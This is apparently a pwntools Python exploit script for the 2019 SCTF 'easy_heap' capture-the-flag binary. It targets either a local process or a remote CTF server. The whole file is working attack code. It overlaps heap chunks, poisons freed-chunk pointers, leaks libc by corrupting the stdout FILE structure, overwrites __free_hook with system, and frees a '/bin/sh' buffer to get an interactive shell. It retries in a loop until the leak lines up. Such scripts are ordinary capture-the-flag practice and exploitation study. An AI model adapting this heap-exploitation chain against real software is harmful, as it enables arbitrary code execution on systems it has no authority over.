import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./sctf_2019_easy_heap')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./sctf_2019_easy_heap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('node3.buuoj.cn',25590)
			elf=ELF('./sctf_2019_easy_heap')
			libc=ELF('../../x64libc/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')

		def add(a):
			io.sendlineafter('>> ','1')
			io.sendlineafter('Size: ',str(a))

		def edit(a,b):
			io.sendlineafter('>> ','3')
			io.sendlineafter('Index: ',str(a))
			io.sendafter('Content: ',b)

		def delete(a):
			io.sendlineafter('>> ','2')
			io.sendlineafter('Index: ',str(a))


		io.recvuntil('0x')
		heap_sss=int(io.recvuntil('\n',drop=True),16)
		add(0x4f8)
		add(0x68)
		add(0x88)
		add(0x4f8)
		add(0x18)
		edit(4,'/bin/sh\x00\n')
		edit(2,'\x00'*0x80+p64(0x600))
		delete(0)
		delete(3)
		delete(1)
		add(0x4f8)
		delete(0)
		add(0x600)
		edit('0','\x00'*0x4f8+p64(0x71)+'\x60\x57\n')
		add(0x68)
		add(0x68)
		edit(3,p64(0xfbad1887)+p64(0)*3+'\xc8'+'\n')
		libc_base=u64(io.recv(8))-libc.sym['_IO_2_1_stdin_']
		libc.address=libc_base
		if (libc_base&0xfff)!=0 : 
			io.close()
			continue
		edit('0','\x00'*0x4f8+p64(0x61)+p64(heap_sss)+'\n')
		delete(1)
		edit('0','\x00'*0x4f8+p64(0x61)+p64(heap_sss)+'\n')
		add(0x58)
		add(0x58)
		edit(5,asm(shellcraft.sh())+'\n')
		edit('0','\x00'*0x4f8+p64(0x51)+p64(libc.sym['__free_hook'])+'\n')
		delete(1)
		edit('0','\x00'*0x4f8+p64(0x51)+p64(libc.sym['__free_hook'])+'\n')
		add(0x48)
		add(0x48)
		edit(6,p64(libc.sym['system'])+'\n')
		delete(4)


		
		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		success('libc_base:'+hex(libc_base))
		success('heap_sss:'+hex(heap_sss))
		# gdb.attach(io)
		# pause()
		io.interactive()

	except Exception as e:
		io.close()
		continue
	else:
		continue